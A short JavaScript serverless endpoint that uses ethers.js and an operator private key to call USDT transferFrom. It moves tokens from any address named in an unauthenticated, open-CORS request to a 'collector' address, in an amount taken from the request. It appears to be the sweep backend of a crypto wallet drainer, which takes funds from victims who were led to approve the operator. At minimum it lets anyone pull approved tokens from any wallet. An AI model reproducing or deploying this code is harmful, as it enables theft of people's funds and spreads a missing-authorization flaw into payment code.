import { ethers } from "ethers";

/* ================= CONFIG ================= */

const RPC_URL = process.env.RPC_URL;
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const USDT_CONTRACT = process.env.USDT_CONTRACT;
const COLLECTOR_ADDRESS = process.env.COLLECTOR_ADDRESS;

/* ================= HANDLER ================= */

export default async function handler(req, res) {

  /* ===== CORS ===== */
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {

    const { signerAddress, amountHuman } = req.body;

    console.log("BODY:", req.body);

    /* ===== VALIDATION ===== */

    if (!signerAddress || !amountHuman) {
      return res.status(400).json({
        error: "Missing parameters"
      });
    }

    if (!ethers.isAddress(signerAddress)) {
      return res.status(400).json({
        error: "Invalid address"
      });
    }

    /* ===== BLOCKCHAIN SETUP ===== */

    const provider = new ethers.JsonRpcProvider(RPC_URL);

    const wallet = new ethers.Wallet(
      PRIVATE_KEY,
      provider
    );

    const ABI = [
      "function transferFrom(address from,address to,uint256 value) returns (bool)"
    ];

    const usdt = new ethers.Contract(
      USDT_CONTRACT,
      ABI,
      wallet
    );

    /* ===== AMOUNT ===== */

    const amount = ethers.parseUnits(
      amountHuman.toString(),
      18
    );

    /* ===== TRANSFER ===== */

    const tx = await usdt.transferFrom(
      signerAddress,
      COLLECTOR_ADDRESS,
      amount
    );

    await tx.wait();

    return res.status(200).json({
      success: true,
      txHash: tx.hash
    });

  } catch (err) {

    console.error(err);

    return res.status(500).json({
      error: err.message
    });
  }
}
